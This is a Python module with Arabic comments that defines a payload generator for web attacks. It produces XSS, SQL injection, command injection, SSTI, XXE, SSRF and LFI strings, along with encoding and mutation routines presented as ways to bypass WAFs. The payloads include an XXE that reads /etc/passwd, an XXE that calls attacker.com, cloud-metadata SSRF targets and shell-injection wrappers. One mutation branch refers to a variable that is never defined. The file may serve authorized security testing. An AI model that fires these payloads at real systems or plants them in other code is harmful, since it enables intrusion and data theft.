
import random
import string
import base64
import hashlib
import urllib.parse
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum
import json

import logging

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """أنواع الحمولات"""
    XSS = "xss"
    SQLI = "sqli"
    RCE = "rce"
    SSTI = "ssti"
    XXE = "xxe"
    SSRF = "ssrf"
    LFI = "lfi"
    RFI = "rfi"
    CMD_INJECT = "cmd_inject"
    LDAP = "ldap"
    XPATH = "xpath"
    NOSQL = "nosql"
    HEADER = "header"
    COOKIE = "cookie"


class EncodingType(Enum):
    """أنواع الترميز"""
    NONE = "none"
    URL = "url"
    URL_DOUBLE = "url_double"
    HTML = "html"
    HEX = "hex"
    BASE64 = "base64"
    UNICODE = "unicode"
    UTF_16 = "utf_16"
    UTF_32 = "utf_32"
    GZIP = "gzip"
    DEFLATE = "deflate"


@dataclass
class Payload:
    """حمولة هجومية"""
    id: str
    name: str
    type: PayloadType
    payload: str
    encoding: EncodingType
    description: str
    tags: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)


class PayloadGenerator:
    """
    مولد الحمولات المتقدم
    
    الميزات:
    - إنشاء حمولات ديناميكية لثغرات مختلفة
    - ترميزات متعددة للتجاوز
    - تحور الحمولات (Mutation)
    - دمج الحمولات (Combination)
    - تضمين المتغيرات العشوائية
    - تقنيات تجاوز WAF
    - حمولات معتمدة على السياق
    """
    
    # وحدات البناء الأساسية
    XSS_PATTERNS = [
        "<script>{payload}</script>",
        "<img src=x onerror={payload}>",
        "<svg onload={payload}>",
        "<body onload={payload}>",
        "<iframe src=javascript:{payload}>",
        "<input onfocus={payload} autofocus>",
        "<details open ontoggle={payload}>",
        "<select autofocus onfocus={payload}>",
        "<textarea autofocus onfocus={payload}>",
        "javascript:{payload}",
        "data:text/html,{encoded_payload}",
    ]
    
    SQLI_PATTERNS = [
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' OR '1'='1",
        "1' OR '1'='2",
        "1' AND SLEEP(5)--",
        "1' AND pg_sleep(5)--",
        "1' WAITFOR DELAY '00:00:05'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
    ]
    
    RCE_PATTERNS = [
        "; {cmd}",
        "| {cmd}",
        "&& {cmd}",
        "|| {cmd}",
        "$({cmd})",
        "`{cmd}`",
        "%0a{cmd}",
        "\\n{cmd}",
        "& {cmd}",
        "2>&1 {cmd}",
    ]
    
    SSTI_PATTERNS = [
        "{{7*7}}",
        "${7*7}",
        "${{7*7}}",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
        "{{self.__class__.__mro__}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${7*7}",
        "${{7*7}}",
        "@(7*7)",
    ]
    
    XXE_PATTERNS = [
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe"> %xxe;]>
<foo>test</foo>""",
    ]
    
    def __init__(self):
        self._payload_cache: Dict[str, List[Payload]] = {}
        self._generated_payloads: List[Payload] = []
        
        logger.info("PayloadGenerator initialized")
    
    def generate_xss_payloads(
        self,
        context: str = "html",
        use_encoding: bool = True,
        max_payloads: int = 50
    ) -> List[Payload]:
        """
        توليد حمولات XSS
        
        Args:
            context: سياق التنفيذ (html, attribute, javascript, css)
            use_encoding: تطبيق ترميزات مختلفة
            max_payloads: الحد الأقصى لعدد الحمولات
        """
        payloads = []
        js_payloads = ["alert('XSS')", "alert(1)", "prompt(1)", "confirm(1)", "console.log(1)"]
        
        for js_payload in js_payloads[:max_payloads//len(self.XSS_PATTERNS) + 1]:
            for pattern in self.XSS_PATTERNS:
                # توليد الحمولة الأساسية
                base_payload = pattern.format(payload=js_payload, encoded_payload=urllib.parse.quote(js_payload))
                
                # إضافة حمولة عادية
                payloads.append(Payload(
                    id=f"xss_{len(payloads)}",
                    name="XSS Payload",
                    type=PayloadType.XSS,
                    payload=base_payload,
                    encoding=EncodingType.NONE,
                    description=f"XSS payload using {pattern[:50]}...",
                    tags=["xss", "reflected", "stored"]
                ))
                
                # إضافة حمولات مشفرة
                if use_encoding:
                    for encoding in [EncodingType.URL, EncodingType.HTML, EncodingType.HEX, EncodingType.BASE64]:
                        encoded = self._apply_encoding(base_payload, encoding)
                        payloads.append(Payload(
                            id=f"xss_{len(payloads)}",
                            name="XSS Payload (Encoded)",
                            type=PayloadType.XSS,
                            payload=encoded,
                            encoding=encoding,
                            description=f"XSS payload encoded with {encoding.value}",
                            tags=["xss", "encoded", "bypass"]
                        ))
        
        return payloads[:max_payloads]
    
    def generate_sqli_payloads(
        self,
        technique: str = "boolean",
        use_encoding: bool = True,
        max_payloads: int = 50
    ) -> List[Payload]:
        """
        توليد حمولات SQL Injection
        
        Args:
            technique: التقنية (boolean, time, union, error)
            use_encoding: تطبيق ترميزات مختلفة
            max_payloads: الحد الأقصى لعدد الحمولات
        """
        payloads = []
        
        # تصفية الحمولات حسب التقنية
        filtered_patterns = self.SQLI_PATTERNS
        
        for pattern in filtered_patterns[:max_payloads]:
            # إضافة حمولة عادية
            payloads.append(Payload(
                id=f"sqli_{len(payloads)}",
                name="SQLi Payload",
                type=PayloadType.SQLI,
                payload=pattern,
                encoding=EncodingType.NONE,
                description=f"SQL injection pattern: {pattern[:50]}",
                tags=[f"sqli_{technique}", "injection"]
            ))
            
            # إضافة حمولات مشفرة
            if use_encoding:
                for encoding in [EncodingType.URL, EncodingType.HEX, EncodingType.UNICODE]:
                    encoded = self._apply_encoding(pattern, encoding)
                    payloads.append(Payload(
                        id=f"sqli_{len(payloads)}",
                        name="SQLi Payload (Encoded)",
                        type=PayloadType.SQLI,
                        payload=encoded,
                        encoding=encoding,
                        description=f"SQL injection payload encoded with {encoding.value}",
                        tags=["sqli", "encoded", "bypass"]
                    ))
        
        return payloads[:max_payloads]
    
    def generate_rce_payloads(
        self,
        platform: str = "linux",
        commands: List[str] = None,
        max_payloads: int = 50
    ) -> List[Payload]:
        """
        توليد حمولات Remote Code Execution
        
        Args:
            platform: المنصة (linux, windows)
            commands: الأوامر لتنفيذها
            max_payloads: الحد الأقصى لعدد الحمولات
        """
        if commands is None:
            commands = ["id", "whoami", "pwd", "ls -la", "cat /etc/passwd", "echo test"]
        
        if platform == "windows":
            commands = ["whoami", "dir", "echo %username%", "systeminfo"]
        
        payloads = []
        
        for cmd in commands[:max_payloads//len(self.RCE_PATTERNS) + 1]:
            for pattern in self.RCE_PATTERNS:
                # توليد الحمولة الأساسية
                base_payload = pattern.format(cmd=cmd)
                
                if platform == "windows":
                    base_payload = base_payload.replace(";", "&")
                
                payloads.append(Payload(
                    id=f"rce_{len(payloads)}",
                    name=f"RCE Payload ({cmd})",
                    type=PayloadType.RCE,
                    payload=base_payload,
                    encoding=EncodingType.NONE,
                    description=f"RCE payload executing '{cmd}'",
                    tags=["rce", "cmd_inject", platform],
                    metadata={"command": cmd, "platform": platform}
                ))
                
                # إضافة حمولة مع ترميز URL
                url_encoded = self._apply_encoding(base_payload, EncodingType.URL)
                payloads.append(Payload(
                    id=f"rce_{len(payloads)}",
                    name=f"RCE Payload ({cmd}) - URL Encoded",
                    type=PayloadType.RCE,
                    payload=url_encoded,
                    encoding=EncodingType.URL,
                    description=f"URL Encoded RCE payload executing '{cmd}'",
                    tags=["rce", "cmd_inject", "encoded"]
                ))
        
        return payloads[:max_payloads]
    
    def generate_ssti_payloads(self, max_payloads: int = 30) -> List[Payload]:
        """توليد حمولات Server-Side Template Injection"""
        payloads = []
        
        for pattern in self.SSTI_PATTERNS[:max_payloads]:
            payloads.append(Payload(
                id=f"ssti_{len(payloads)}",
                name="SSTI Payload",
                type=PayloadType.SSTI,
                payload=pattern,
                encoding=EncodingType.NONE,
                description=f"SSTI payload: {pattern[:50]}",
                tags=["ssti", "template_injection"]
            ))
        
        return payloads
    
    def generate_xxe_payloads(self, max_payloads: int = 10) -> List[Payload]:
        """توليد حمولات XML External Entity"""
        payloads = []
        
        for pattern in self.XXE_PATTERNS[:max_payloads]:
            payloads.append(Payload(
                id=f"xxe_{len(payloads)}",
                name="XXE Payload",
                type=PayloadType.XXE,
                payload=pattern,
                encoding=EncodingType.NONE,
                description="XXE injection payload",
                tags=["xxe", "xml", "entity"]
            ))
        
        return payloads
    
    def generate_ssrf_payloads(self, max_payloads: int = 20) -> List[Payload]:
        """توليد حمولات Server-Side Request Forgery"""
        targets = [
            "http://127.0.0.1:80",
            "http://localhost:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://192.168.0.1:80",
            "http://10.0.0.1:80",
            "file:///etc/passwd",
            "dict://127.0.0.1:11211/stat",
        ]
        
        payloads = []
        for target in targets[:max_payloads]:
            payloads.append(Payload(
                id=f"ssrf_{len(payloads)}",
                name="SSRF Payload",
                type=PayloadType.SSRF,
                payload=target,
                encoding=EncodingType.NONE,
                description=f"SSRF payload targeting {target}",
                tags=["ssrf", "request_forgery"],
                metadata={"target": target}
            ))
        
        return payloads
    
    def generate_lfi_payloads(self, max_payloads: int = 30) -> List[Payload]:
        """توليد حمولات Local File Inclusion"""
        paths = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
        ]
        
        payloads = []
        for path in paths[:max_payloads]:
            payloads.append(Payload(
                id=f"lfi_{len(payloads)}",
                name="LFI Payload",
                type=PayloadType.LFI,
                payload=path,
                encoding=EncodingType.NONE,
                description=f"LFI payload: {path}",
                tags=["lfi", "file_inclusion"]
            ))
            
            # إضافة ترميز URL
            url_encoded = self._apply_encoding(path, EncodingType.URL)
            payloads.append(Payload(
                id=f"lfi_{len(payloads)}",
                name="LFI Payload (URL Encoded)",
                type=PayloadType.LFI,
                payload=url_encoded,
                encoding=EncodingType.URL,
                description=f"URL Encoded LFI payload: {path}",
                tags=["lfi", "encoded"]
            ))
        
        return payloads[:max_payloads]
    
    def generate_random_payloads(
        self,
        payload_type: PayloadType,
        count: int = 10,
        min_length: int = 10,
        max_length: int = 100
    ) -> List[Payload]:
        """
        توليد حمولات عشوائية
        
        Args:
            payload_type: نوع الحمولة
            count: عدد الحمولات
            min_length: الحد الأدنى للطول
            max_length: الحد الأقصى للطول
        """
        payloads = []
        
        for i in range(count):
            length = random.randint(min_length, max_length)
            random_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
            
            if payload_type == PayloadType.XSS:
                random_payload = f"<script>{random_chars}</script>"
            elif payload_type == PayloadType.SQLI:
                random_payload = f"'{random_chars}' OR '1'='1"
            elif payload_type == PayloadType.RCE:
                random_payload = f"; echo {random_chars}"
            else:
                random_payload = random_chars
            
            payloads.append(Payload(
                id=f"random_{payload_type.value}_{i}",
                name=f"Random {payload_type.value.upper()} Payload {i+1}",
                type=payload_type,
                payload=random_payload,
                encoding=EncodingType.NONE,
                description=f"Randomly generated {payload_type.value} payload",
                tags=["random", "generated"]
            ))
        
        return payloads
    
    def mutate_payload(self, payload: Payload, mutations: int = 5) -> List[Payload]:
        """
        تحوير حمولة (Mutation)
        
        يقوم بإنشاء نسخ متحورة من الحمولة الأصلية
        """
        mutated = []
        
        for i in range(mutations):
            # أنواع التحوير المختلفة
            mutation_type = random.choice(["case", "whitespace", "encoding", "comment", "reorder"])
            
            if mutation_type == "case":
                # تغيير حالة الأحرف
                new_payload = ''.join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in payload.payload
                )
            elif mutation_type == "whitespace":
                # إضافة مسافات إضافية
                new_payload = payload.payload.replace(" ", " " * random.randint(1, 10))
            elif mutation_type == "encoding":
                # ترميز عشوائي
                encoding = random.choice(list(EncodingType))
                new_payload = self._apply_encoding(payload.payload, encoding)
            elif mutation_type == "comment":
                # إضافة تعليقات
                new_payload = payload.payload + f"/*{random_chars}*/"
            else:
                new_payload = payload.payload
            
            mutated.append(Payload(
                id=f"{payload.id}_mutated_{i}",
                name=f"{payload.name} (Mutated)",
                type=payload.type,
                payload=new_payload,
                encoding=payload.encoding,
                description=f"Mutated version of {payload.name}",
                tags=payload.tags + ["mutated"],
                metadata={"original_id": payload.id, "mutation_type": mutation_type}
            ))
        
        return mutated
    
    def combine_payloads(self, payloads: List[Payload], combination_count: int = 10) -> List[Payload]:
        """
        دمج حمولات متعددة
        
        يقوم بدمج حمولات مختلفة لتوليد حمولات مركبة
        """
        combined = []
        
        for i in range(min(combination_count, len(payloads) * 2)):
            selected = random.sample(payloads, min(3, len(payloads)))
            combined_payload = "".join(p.payload for p in selected)
            
            combined.append(Payload(
                id=f"combined_{i}",
                name="Combined Payload",
                type=selected[0].type,  # نوع أول حمولة
                payload=combined_payload,
                encoding=EncodingType.NONE,
                description=f"Combination of {', '.join(p.name for p in selected)}",
                tags=["combined"] + [tag for p in selected for tag in p.tags],
                metadata={"components": [p.id for p in selected]}
            ))
        
        return combined
    
    def _apply_encoding(self, payload: str, encoding: EncodingType) -> str:
        """تطبيق ترميز على الحمولة"""
        if encoding == EncodingType.URL:
            return urllib.parse.quote(payload)
        elif encoding == EncodingType.URL_DOUBLE:
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == EncodingType.HTML:
            return payload.replace("<", "&lt;").replace(">", "&gt;")
        elif encoding == EncodingType.HEX:
            return payload.encode().hex()
        elif encoding == EncodingType.BASE64:
            return base64.b64encode(payload.encode()).decode()
        elif encoding == EncodingType.UNICODE:
            return ''.join(f"\\u{ord(c):04x}" for c in payload)
        else:
            return payload
    
    def get_payloads_by_type(self, payload_type: PayloadType) -> List[Payload]:
        """الحصول على جميع الحمولات من نوع معين"""
        return [p for p in self._generated_payloads if p.type == payload_type]
    
    def get_payloads_by_tag(self, tag: str) -> List[Payload]:
        """الحصول على جميع الحمولات ذات علامة معينة"""
        return [p for p in self._generated_payloads if tag in p.tags]
    
    async def generate_all_payloads(self) -> Dict[PayloadType, List[Payload]]:
        """توليد جميع أنواع الحمولات"""
        all_payloads = {
            PayloadType.XSS: self.generate_xss_payloads(max_payloads=100),
            PayloadType.SQLI: self.generate_sqli_payloads(max_payloads=100),
            PayloadType.RCE: self.generate_rce_payloads(max_payloads=100),
            PayloadType.SSTI: self.generate_ssti_payloads(),
            PayloadType.XXE: self.generate_xxe_payloads(),
            PayloadType.SSRF: self.generate_ssrf_payloads(),
            PayloadType.LFI: self.generate_lfi_payloads(),
        }
        
        # تخزين جميع الحمولات
        for payloads in all_payloads.values():
            self._generated_payloads.extend(payloads)
        
        return all_payloads


# نسخة عالمية
_default_generator = None


def get_payload_generator() -> PayloadGenerator:
    """الحصول على نسخة عالمية من مولد الحمولات"""
    global _default_generator
    if _default_generator is None:
        _default_generator = PayloadGenerator()
    return _default_generator

